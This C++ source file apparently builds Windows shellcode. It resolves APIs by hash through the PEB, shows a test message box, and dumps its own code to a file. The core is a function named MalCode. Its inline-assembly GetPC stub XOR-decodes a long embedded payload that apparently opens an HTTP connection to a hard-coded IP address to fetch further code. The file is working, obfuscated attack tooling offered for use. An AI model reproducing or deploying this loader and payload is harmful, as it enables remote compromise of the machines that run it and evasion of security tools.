#include "ScStdio.h"

#define ROR_SHIFT 13

namespace ScStdio {

	/*
		VS Compilation Switches:
		C/C++ -> Optimization -> /O1, /Ob2, /Oi, /Os, /Oy-, /GL
		C/C++ -> Code Generation -> /MT, /GS-, /Gy
		Linker -> General -> /INCREMENTAL:NO
	*/

#ifndef _WIN64
	__declspec(naked) void MalCodeBegin() { __asm { jmp MalCode } };
#else
	void MalCodeBegin() { MalCode(); }
#endif

	PPEB getPEB() {
		PPEB p;
#ifndef _WIN64
		p = (PPEB)__readfsdword(0x30);
#else
		p = (PPEB)__readgsqword(0x60);
#endif
		return p;
	}

	constexpr DWORD ct_ror(DWORD n) {
		return (n >> ROR_SHIFT) | (n << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
	}

	constexpr char ct_upper(const char c) {
		return (c >= 'a') ? (c - ('a' - 'A')) : c;
	}

	constexpr DWORD ct_hash(const char *str, DWORD sum = 0) {
		return *str ? ct_hash(str + 1, ct_ror(sum) + ct_upper(*str)) : sum;
	}

	DWORD rt_hash(const char *str) {
		DWORD h = 0;
		while (*str) {
			h = (h >> ROR_SHIFT) | (h << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
			h += *str >= 'a' ? *str - ('a' - 'A') : *str;
			str++;
		}
		return h;
	}

	LDR_DATA_TABLE_ENTRY *getDataTableEntry(const LIST_ENTRY *ptr) {
		int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		return (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);
	}

	PVOID getProcAddrByHash(DWORD hash) {
		PEB *peb = getPEB();
		LIST_ENTRY *first = peb->Ldr->InMemoryOrderModuleList.Flink;
		LIST_ENTRY *ptr = first;
		do {
			LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
			ptr = ptr->Flink;

			BYTE *baseAddress = (BYTE *)dte->DllBase;
			if (!baseAddress)
				continue;
			IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;
			IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader->e_lfanew);
			DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			if (!iedRVA)
				continue;
			IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);
			char *moduleName = (char *)(baseAddress + ied->Name);
			DWORD moduleHash = rt_hash(moduleName);
			DWORD *nameRVAs = (DWORD *)(baseAddress + ied->AddressOfNames);
			for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
				char *functionName = (char *)(baseAddress + nameRVAs[i]);
				if (hash == moduleHash + rt_hash(functionName)) {
					WORD ordinal = ((WORD *)(baseAddress + ied->AddressOfNameOrdinals))[i];
					DWORD functionRVA = ((DWORD *)(baseAddress + ied->AddressOfFunctions))[ordinal];
					return baseAddress + functionRVA;
				}
			}
		} while (ptr != first);

		return NULL;
	}

#define DEFINE_FUNC_PTR(module, function) \
	constexpr DWORD hash_##function = ct_hash(module) + ct_hash(#function); \
	typedef decltype(function) type_##function; \
	type_##function *##function = (type_##function *)getProcAddrByHash(hash_##function)

#define DEFINE_FWD_FUNC_PTR(module, real_func, function) \
	constexpr DWORD hash_##function = ct_hash(module) + ct_hash(real_func); \
	typedef decltype(function) type_##function; \
	type_##function *##function = (type_##function *)getProcAddrByHash(hash_##function)

	VOID __stdcall MalCode() {

		CHAR strUser32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
		CHAR strMboxTitle[] = { 'S','h','e','l','l','S','t','d','i','o', 0 };
		CHAR strMboxMsg[] = { 'H','e','l','l','o',' ', 'W','o','r','l','d','!',0 };

		DEFINE_FUNC_PTR("kernel32.dll", LoadLibraryA);
		LoadLibraryA(strUser32);

		DEFINE_FUNC_PTR("user32.dll", MessageBoxA);
		MessageBoxA(NULL, strMboxMsg, strMboxTitle, MB_OK);
			
		__asm {

		_start:
		fabs; fabs指令
		fnstenv[esp]; 保存环境，该结构偏移12字节处就是最后执行的浮点指令的运行时地址
		pop edx
		pop edx
		pop edx
		pop edx; 此处将fabs指令的运行时地址传给edx
		add edx, 26; offset from fabs ->xor buffer    edx = edx + 26, 26的大小指的是从shllcode到fabs的偏移
			
		SHORT_XOR_BEG:
		XOR ECX, ECX
		ADD ECX, 0x343; payload size

		short_xor_xor:
		xor [edx], 0xc3; 
		inc edx;
		loop short_xor_xor

		shellcode :
		_EMIT 0x3F
		_EMIT 0x2B
		_EMIT 0x4A
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xA3
		_EMIT 0x4A
		_EMIT 0x26
		_EMIT 0xF2
		_EMIT 0x11
		_EMIT 0xA7
		_EMIT 0x48
		_EMIT 0x91
		_EMIT 0xF3
		_EMIT 0x48
		_EMIT 0x91
		_EMIT 0xCF
		_EMIT 0x48
		_EMIT 0x91
		_EMIT 0xD7
		_EMIT 0x48
		_EMIT 0xB1
		_EMIT 0xEB
		_EMIT 0xCC
		_EMIT 0x74
		_EMIT 0x89
		_EMIT 0xE5
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0xF2
		_EMIT 0x03
		_EMIT 0x6F
		_EMIT 0xFF
		_EMIT 0xA2
		_EMIT 0xBF
		_EMIT 0xC1
		_EMIT 0xEF
		_EMIT 0xE3
		_EMIT 0x02
		_EMIT 0x0C
		_EMIT 0xCE
		_EMIT 0xC2
		_EMIT 0x04
		_EMIT 0x21
		_EMIT 0x33
		_EMIT 0x91
		_EMIT 0x94
		_EMIT 0x48
		_EMIT 0x91
		_EMIT 0xD3
		_EMIT 0x48
		_EMIT 0x81
		_EMIT 0xFF
		_EMIT 0xC2
		_EMIT 0x13
		_EMIT 0x48
		_EMIT 0x83
		_EMIT 0xBB
		_EMIT 0x46
		_EMIT 0x03
		_EMIT 0xB7
		_EMIT 0x89
		_EMIT 0xC2
		_EMIT 0x13
		_EMIT 0x93
		_EMIT 0x48
		_EMIT 0x8B
		_EMIT 0xDB
		_EMIT 0x48
		_EMIT 0x9B
		_EMIT 0xE3
		_EMIT 0xC2
		_EMIT 0x10
		_EMIT 0x20
		_EMIT 0xFF
		_EMIT 0x8A
		_EMIT 0x48
		_EMIT 0xF7
		_EMIT 0x48
		_EMIT 0xC2
		_EMIT 0x15
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0xF2
		_EMIT 0x03
		_EMIT 0x6F
		_EMIT 0x02
		_EMIT 0x0C
		_EMIT 0xCE
		_EMIT 0xC2
		_EMIT 0x04
		_EMIT 0xFB
		_EMIT 0x23
		_EMIT 0xB6
		_EMIT 0x37
		_EMIT 0xC0
		_EMIT 0xBE
		_EMIT 0x3B
		_EMIT 0xF8
		_EMIT 0xBE
		_EMIT 0xE7
		_EMIT 0xB6
		_EMIT 0x21
		_EMIT 0x9B
		_EMIT 0x48
		_EMIT 0x9B
		_EMIT 0xE7
		_EMIT 0xC2
		_EMIT 0x10
		_EMIT 0xA5
		_EMIT 0x48
		_EMIT 0xCF
		_EMIT 0x88
		_EMIT 0x48
		_EMIT 0x9B
		_EMIT 0xDF
		_EMIT 0xC2
		_EMIT 0x10
		_EMIT 0x48
		_EMIT 0xC7
		_EMIT 0x48
		_EMIT 0xC2
		_EMIT 0x13
		_EMIT 0x4A
		_EMIT 0x87
		_EMIT 0xE7
		_EMIT 0xE7
		_EMIT 0x98
		_EMIT 0x98
		_EMIT 0xA2
		_EMIT 0x9A
		_EMIT 0x99
		_EMIT 0x92
		_EMIT 0x3C
		_EMIT 0x23
		_EMIT 0x9B
		_EMIT 0x9C
		_EMIT 0x99
		_EMIT 0x48
		_EMIT 0xD1
		_EMIT 0x28
		_EMIT 0x45
		_EMIT 0x9E
		_EMIT 0xAB
		_EMIT 0xAD
		_EMIT 0xA6
		_EMIT 0xB7
		_EMIT 0xC3
		_EMIT 0xAB
		_EMIT 0xB4
		_EMIT 0xAA
		_EMIT 0xAD
		_EMIT 0xAA
		_EMIT 0x97
		_EMIT 0xAB
		_EMIT 0x8F
		_EMIT 0xB4
		_EMIT 0xE5
		_EMIT 0xC4
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x2B
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0x94
		_EMIT 0x94
		_EMIT 0x94
		_EMIT 0x94
		_EMIT 0x94
		_EMIT 0xAB
		_EMIT 0xF9
		_EMIT 0x95
		_EMIT 0xBA
		_EMIT 0x64
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x2A
		_EMIT 0x67
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x98
		_EMIT 0xF2
		_EMIT 0x0A
		_EMIT 0x92
		_EMIT 0x92
		_EMIT 0xA9
		_EMIT 0xC0
		_EMIT 0x92
		_EMIT 0x92
		_EMIT 0xAB
		_EMIT 0x78
		_EMIT 0xC2
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x90
		_EMIT 0x93
		_EMIT 0xAB
		_EMIT 0x94
		_EMIT 0x4A
		_EMIT 0x5C
		_EMIT 0x05
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x93
		_EMIT 0x2A
		_EMIT 0x4F
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x98
		_EMIT 0xF2
		_EMIT 0x11
		_EMIT 0x91
		_EMIT 0xAB
		_EMIT 0xC3
		_EMIT 0xF1
		_EMIT 0x03
		_EMIT 0x47
		_EMIT 0x91
		_EMIT 0x91
		_EMIT 0x91
		_EMIT 0x90
		_EMIT 0x91
		_EMIT 0x93
		_EMIT 0xAB
		_EMIT 0x28
		_EMIT 0x96
		_EMIT 0xED
		_EMIT 0xF8
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x4A
		_EMIT 0x05
		_EMIT 0x40
		_EMIT 0x00
		_EMIT 0x93
		_EMIT 0xAB
		_EMIT 0x43
		_EMIT 0xF0
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x4A
		_EMIT 0x23
		_EMIT 0xA9
		_EMIT 0xC7
		_EMIT 0x93
		_EMIT 0xA9
		_EMIT 0xDC
		_EMIT 0x95
		_EMIT 0xAB
		_EMIT 0xB6
		_EMIT 0x85
		_EMIT 0x5D
		_EMIT 0x45
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x9C
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0x94
		_EMIT 0x94
		_EMIT 0xA9
		_EMIT 0x3C
		_EMIT 0x90
		_EMIT 0x95
		_EMIT 0xAB
		_EMIT 0xEE
		_EMIT 0xC5
		_EMIT 0xDB
		_EMIT 0xB8
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x46
		_EMIT 0x03
		_EMIT 0xCC
		_EMIT 0x47
		_EMIT 0x09
		_EMIT 0xC2
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0x46
		_EMIT 0x35
		_EMIT 0xB7
		_EMIT 0xC7
		_EMIT 0x4A
		_EMIT 0x3A
		_EMIT 0x28
		_EMIT 0xCA
		_EMIT 0xAB
		_EMIT 0x69
		_EMIT 0x06
		_EMIT 0x21
		_EMIT 0x9E
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x4A
		_EMIT 0x02
		_EMIT 0xAB
		_EMIT 0x86
		_EMIT 0xE2
		_EMIT 0x9D
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0x94
		_EMIT 0xA9
		_EMIT 0xC4
		_EMIT 0x92
		_EMIT 0x95
		_EMIT 0x93
		_EMIT 0xAB
		_EMIT 0x74
		_EMIT 0x94
		_EMIT 0x23
		_EMIT 0xC8
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x7C
		_EMIT 0xC3
		_EMIT 0xEC
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xFA
		_EMIT 0x04
		_EMIT 0xB6
		_EMIT 0xC4
		_EMIT 0x9B
		_EMIT 0x93
		_EMIT 0x2A
		_EMIT 0xB8
		_EMIT 0x3C
		_EMIT 0x3C
		_EMIT 0x3C
		_EMIT 0xF2
		_EMIT 0x3C
		_EMIT 0x2A
		_EMIT 0x52
		_EMIT 0xC2
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x2A
		_EMIT 0x0A
		_EMIT 0xC2
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x2B
		_EMIT 0xAC
		_EMIT 0x3C
		_EMIT 0x3C
		_EMIT 0x3C
		_EMIT 0xEC
		_EMIT 0xA9
		_EMIT 0x8F
		_EMIT 0x8F
		_EMIT 0x99
		_EMIT 0xC3
		_EMIT 0xF6
		_EMIT 0x8C
		_EMIT 0xE2
		_EMIT 0x93
		_EMIT 0xE6
		_EMIT 0x83
		_EMIT 0x82
		_EMIT 0x93
		_EMIT 0x98
		_EMIT 0xF7
		_EMIT 0x9F
		_EMIT 0x93
		_EMIT 0x99
		_EMIT 0x9B
		_EMIT 0xF6
		_EMIT 0xF7
		_EMIT 0xEB
		_EMIT 0x93
		_EMIT 0x9D
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0x80
		_EMIT 0x80
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0xBE
		_EMIT 0xE7
		_EMIT 0x86
		_EMIT 0x8A
		_EMIT 0x80
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0xEE
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x87
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0x87
		_EMIT 0xEE
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x97
		_EMIT 0x8A
		_EMIT 0x95
		_EMIT 0x8A
		_EMIT 0x91
		_EMIT 0x96
		_EMIT 0x90
		_EMIT 0xEE
		_EMIT 0x97
		_EMIT 0x86
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0xEE
		_EMIT 0x85
		_EMIT 0x8A
		_EMIT 0x8F
		_EMIT 0x86
		_EMIT 0xE2
		_EMIT 0xE7
		_EMIT 0x8B
		_EMIT 0xE8
		_EMIT 0x8B
		_EMIT 0xE9
		_EMIT 0xC3
		_EMIT 0xF6
		_EMIT 0x8C
		_EMIT 0xE2
		_EMIT 0x93
		_EMIT 0xE6
		_EMIT 0xC3
		_EMIT 0x96
		_EMIT 0xB0
		_EMIT 0xA6
		_EMIT 0xB1
		_EMIT 0xEE
		_EMIT 0x82
		_EMIT 0xA4
		_EMIT 0xA6
		_EMIT 0xAD
		_EMIT 0xB7
		_EMIT 0xF9
		_EMIT 0xE3
		_EMIT 0x8E
		_EMIT 0xAC
		_EMIT 0xB9
		_EMIT 0xAA
		_EMIT 0xAF
		_EMIT 0xAF
		_EMIT 0xA2
		_EMIT 0xEC
		_EMIT 0xF6
		_EMIT 0xED
		_EMIT 0xF3
		_EMIT 0xE3
		_EMIT 0xEB
		_EMIT 0xA0
		_EMIT 0xAC
		_EMIT 0xAE
		_EMIT 0xB3
		_EMIT 0xA2
		_EMIT 0xB7
		_EMIT 0xAA
		_EMIT 0xA1
		_EMIT 0xAF
		_EMIT 0xA6
		_EMIT 0xF8
		_EMIT 0xE3
		_EMIT 0x8E
		_EMIT 0x90
		_EMIT 0x8A
		_EMIT 0x86
		_EMIT 0xE3
		_EMIT 0xFA
		_EMIT 0xED
		_EMIT 0xF3
		_EMIT 0xF8
		_EMIT 0xE3
		_EMIT 0x94
		_EMIT 0xAA
		_EMIT 0xAD
		_EMIT 0xA7
		_EMIT 0xAC
		_EMIT 0xB4
		_EMIT 0xB0
		_EMIT 0xE3
		_EMIT 0x8D
		_EMIT 0x97
		_EMIT 0xE3
		_EMIT 0xF5
		_EMIT 0xED
		_EMIT 0xF2
		_EMIT 0xF8
		_EMIT 0xE3
		_EMIT 0x94
		_EMIT 0x8C
		_EMIT 0x94
		_EMIT 0xF5
		_EMIT 0xF7
		_EMIT 0xF8
		_EMIT 0xE3
		_EMIT 0x97
		_EMIT 0xB1
		_EMIT 0xAA
		_EMIT 0xA7
		_EMIT 0xA6
		_EMIT 0xAD
		_EMIT 0xB7
		_EMIT 0xEC
		_EMIT 0xF6
		_EMIT 0xED
		_EMIT 0xF3
		_EMIT 0xF8
		_EMIT 0xE3
		_EMIT 0x85
		_EMIT 0xB6
		_EMIT 0xAD
		_EMIT 0x94
		_EMIT 0xA6
		_EMIT 0xA1
		_EMIT 0x93
		_EMIT 0xB1
		_EMIT 0xAC
		_EMIT 0xA7
		_EMIT 0xB6
		_EMIT 0xA0
		_EMIT 0xB7
		_EMIT 0xB0
		_EMIT 0xEA
		_EMIT 0xCE
		_EMIT 0xC9
		_EMIT 0xC3
		_EMIT 0xF6
		_EMIT 0x8C
		_EMIT 0xE2
		_EMIT 0x93
		_EMIT 0xE6
		_EMIT 0x83
		_EMIT 0x82
		_EMIT 0x93
		_EMIT 0x98
		_EMIT 0xF7
		_EMIT 0x9F
		_EMIT 0x93
		_EMIT 0x99
		_EMIT 0x9B
		_EMIT 0xF6
		_EMIT 0xF7
		_EMIT 0xEB
		_EMIT 0x93
		_EMIT 0x9D
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0x80
		_EMIT 0x80
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0xBE
		_EMIT 0xE7
		_EMIT 0x86
		_EMIT 0x8A
		_EMIT 0x80
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0xEE
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x87
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0x87
		_EMIT 0xEE
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x97
		_EMIT 0x8A
		_EMIT 0x95
		_EMIT 0x8A
		_EMIT 0x91
		_EMIT 0x96
		_EMIT 0x90
		_EMIT 0xEE
		_EMIT 0x97
		_EMIT 0x86
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0xEE
		_EMIT 0x85
		_EMIT 0x8A
		_EMIT 0x8F
		_EMIT 0x86
		_EMIT 0xE2
		_EMIT 0xE7
		_EMIT 0x8B
		_EMIT 0xE8
		_EMIT 0x8B
		_EMIT 0xE9
		_EMIT 0xC3
		_EMIT 0xF6
		_EMIT 0x8C
		_EMIT 0xE2
		_EMIT 0x93
		_EMIT 0xE6
		_EMIT 0x83
		_EMIT 0x82
		_EMIT 0x93
		_EMIT 0x98
		_EMIT 0xF7
		_EMIT 0x9F
		_EMIT 0x93
		_EMIT 0x99
		_EMIT 0x9B
		_EMIT 0xF6
		_EMIT 0xF7
		_EMIT 0xEB
		_EMIT 0x93
		_EMIT 0x9D
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0x80
		_EMIT 0x80
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0xBE
		_EMIT 0xE7
		_EMIT 0x86
		_EMIT 0x8A
		_EMIT 0x80
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0xEE
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x87
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0x87
		_EMIT 0xEE
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x97
		_EMIT 0x8A
		_EMIT 0x95
		_EMIT 0x8A
		_EMIT 0x91
		_EMIT 0x96
		_EMIT 0x90
		_EMIT 0xEE
		_EMIT 0x97
		_EMIT 0x86
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0xEE
		_EMIT 0x85
		_EMIT 0x8A
		_EMIT 0x8F
		_EMIT 0x86
		_EMIT 0xE2
		_EMIT 0xE7
		_EMIT 0x8B
		_EMIT 0xE8
		_EMIT 0x8B
		_EMIT 0xE9
		_EMIT 0xC3
		_EMIT 0xF6
		_EMIT 0x8C
		_EMIT 0xE2
		_EMIT 0x93
		_EMIT 0xE6
		_EMIT 0x83
		_EMIT 0x82
		_EMIT 0x93
		_EMIT 0x98
		_EMIT 0xF7
		_EMIT 0x9F
		_EMIT 0x93
		_EMIT 0x99
		_EMIT 0x9B
		_EMIT 0xF6
		_EMIT 0xF7
		_EMIT 0xEB
		_EMIT 0x93
		_EMIT 0x9D
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0x80
		_EMIT 0x80
		_EMIT 0xEA
		_EMIT 0xF4
		_EMIT 0xBE
		_EMIT 0xE7
		_EMIT 0x86
		_EMIT 0x8A
		_EMIT 0x80
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0xEE
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x87
		_EMIT 0x82
		_EMIT 0x91
		_EMIT 0x87
		_EMIT 0xEE
		_EMIT 0x82
		_EMIT 0x8D
		_EMIT 0x97
		_EMIT 0x8A
		_EMIT 0x95
		_EMIT 0x8A
		_EMIT 0x91
		_EMIT 0x96
		_EMIT 0x90
		_EMIT 0xEE
		_EMIT 0x97
		_EMIT 0x86
		_EMIT 0x90
		_EMIT 0x97
		_EMIT 0xEE
		_EMIT 0x85
		_EMIT 0x8A
		_EMIT 0x8F
		_EMIT 0x86
		_EMIT 0xE2
		_EMIT 0xE7
		_EMIT 0x8B
		_EMIT 0xE8
		_EMIT 0x8B
		_EMIT 0xC3
		_EMIT 0xAB
		_EMIT 0x33
		_EMIT 0x76
		_EMIT 0x61
		_EMIT 0x95
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0xA9
		_EMIT 0x83
		_EMIT 0xAB
		_EMIT 0xC3
		_EMIT 0xD3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xAB
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x83
		_EMIT 0xC3
		_EMIT 0x94
		_EMIT 0xAB
		_EMIT 0x9B
		_EMIT 0x67
		_EMIT 0x90
		_EMIT 0x26
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x50
		_EMIT 0x7A
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC2
		_EMIT 0x1A
		_EMIT 0x92
		_EMIT 0x90
		_EMIT 0x4A
		_EMIT 0x24
		_EMIT 0x94
		_EMIT 0xAB
		_EMIT 0xC3
		_EMIT 0xE3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0x90
		_EMIT 0x95
		_EMIT 0xAB
		_EMIT 0xD1
		_EMIT 0x55
		_EMIT 0x4A
		_EMIT 0x21
		_EMIT 0x3C
		_EMIT 0x16
		_EMIT 0x46
		_EMIT 0x03
		_EMIT 0xB7
		_EMIT 0x05
		_EMIT 0x48
		_EMIT 0xC4
		_EMIT 0xC2
		_EMIT 0x00
		_EMIT 0x46
		_EMIT 0x03
		_EMIT 0xB6
		_EMIT 0x26
		_EMIT 0x9B
		_EMIT 0x00
		_EMIT 0x2B
		_EMIT 0x4A
		_EMIT 0x3E
		_EMIT 0x3C
		_EMIT 0x3C
		_EMIT 0xFB
		_EMIT 0xF1
		_EMIT 0xED
		_EMIT 0xF2
		_EMIT 0xF6
		_EMIT 0xF5
		_EMIT 0xED
		_EMIT 0xF1
		_EMIT 0xFB
		_EMIT 0xED
		_EMIT 0xF2
		_EMIT 0xF7
		_EMIT 0xF2
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		_EMIT 0xC3
		}
	}

#ifndef _WIN64
	__declspec(naked) void MalCodeEnd() { };
#else
	void MalCodeEnd() {};
#endif

	BOOL WriteShellcodeToDisk()
	{
		DWORD dwWritten;
		HANDLE FileHandle = CreateFileW(L"shellcode.bin", GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, NULL, NULL);

		if (!FileHandle)
			return false;

		if (WriteFile(FileHandle, &MalCodeBegin, ((DWORD)&MalCodeEnd - (DWORD)&MalCodeBegin), &dwWritten, NULL))
		{
			CloseHandle(FileHandle);
			return true;
		}

		CloseHandle(FileHandle);
		return false;
	}
}
